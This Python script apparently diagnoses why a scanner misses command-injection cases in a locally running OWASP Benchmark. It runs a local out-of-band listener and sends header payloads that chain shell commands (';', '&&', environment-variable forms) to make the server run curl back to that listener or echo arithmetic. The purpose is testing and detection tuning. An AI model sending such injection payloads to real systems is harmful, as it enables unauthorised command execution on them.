#!/usr/bin/env python3
"""cmdi round (task 49) — live diagnosis of representative FN tests on the
running benchmark stack. Manual probes ONLY (curl-equivalent via urllib):
for each FN test: read its source to learn the surface (query/header/cookie
+ sink shape), then send the engine's CURRENT battery forms by hand and
record what is observable. The local OAST channel is mimicked with a tiny
listener so OOB callbacks are visible."""
import json
import re
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = "http://localhost:8080/benchmark"
TESTS = sys.argv[1:] or ["BenchmarkTest00172", "BenchmarkTest00497", "BenchmarkTest01064",
                         "BenchmarkTest02342", "BenchmarkTest02612"]

# ---- tiny local OAST mimic ----
HITS = []
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append({"path": self.path, "ip": self.client_address[0], "t": time.time()})
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass
srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
PORT = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
OAST = f"http://127.0.0.1:{PORT}"

TMO = 10

def probe(path, header=None, cookie=None, param=None, body=None, method="POST"):
    req = urllib.request.Request(BASE + path, method=method)
    if header:
        for k, v in header.items(): req.add_header(k, v)
    if cookie:
        req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookie.items()))
    data = None
    if body is not None:
        data = body.encode()
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if param:
        from urllib.parse import urlencode
        data = urlencode(param).encode()
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, data=data, timeout=TMO)
        body_txt = r.read().decode("utf-8", "replace")
        return {"status": r.status, "ms": round((time.time()-t0)*1000), "body": body_txt[:400]}
    except Exception as e:
        return {"error": repr(e)[:200]}

def oob_hits():
    time.sleep(1.0)
    return list(HITS)

results = {}
for t in TESTS:
    src = open(f"/home/z/tools/benchmark/src/main/java/org/owasp/benchmark/testcode/{t}.java").read()
    # surface detection
    surf = []
    if 'request.getHeader' in src: surf.append("header")
    if 'getCookies' in src or 'request.getCookies' in src: surf.append("cookie")
    if 'request.getParameter' in src or 'map.get("' in src: surf.append("query-or-resolver")
    # sink detection
    sinks = []
    if re.search(r'\.exec\s*\(\s*(args|cmd|bar|param)?', src) or 'r.exec(' in src:
        if 'argsEnv' in src: sinks.append("exec(String[],String[] envp[,dir])")
        elif 'new String[]' in src or 'Arrays.asList' in src or 'getOSCommandArray' in src: sinks.append("exec-argv-array")
        elif re.search(r'exec\s*\(\s*[a-z]+\s*\)', src): sinks.append("exec(String)")
    if 'ProcessBuilder' in src: sinks.append("ProcessBuilder")
    results[t] = {"surface": surf, "sinks": sinks,
                  "resolver": "resolver" in src or "doSomething" in src,
                  "eval_env": "argsEnv" in src}
    print(t, results[t])

print("\nOAST listener at", OAST)
# LIVE PROBES on 00172 (header + envp array)
print("\n=== 00172: engine-form OOB twins by hand (header channel) ===")
for form, payload in [("twin-env", f"FOO=curl -s {OAST}/t172 ;"),
                       ("twin-direct", f"curl -s {OAST}/t172d"),
                       ("variant-semi", f"sentinel; curl -s {OAST}/t172v ;"),
                       ("variant-and", f"sentinel&& curl -s {OAST}/t172a"),
                       ("echo-arith", "sentinel; echo $((6*7))"),
                       ("env-arith", "FOO=echo $((6*7))")]:
    before = len(HITS)
    r = probe("/cmdi-00/BenchmarkTest00172", header={"BenchmarkTest00172": payload})
    got = oob_hits()
    print(f"[{form}] payload={payload!r} -> {r.get('status') or r.get('error')} "
          f"body_snip={r.get('body','')[:120]!r} oob={len(got)-before}")
print(json.dumps({"oast": OAST, "hits": HITS}, indent=1)[:400])
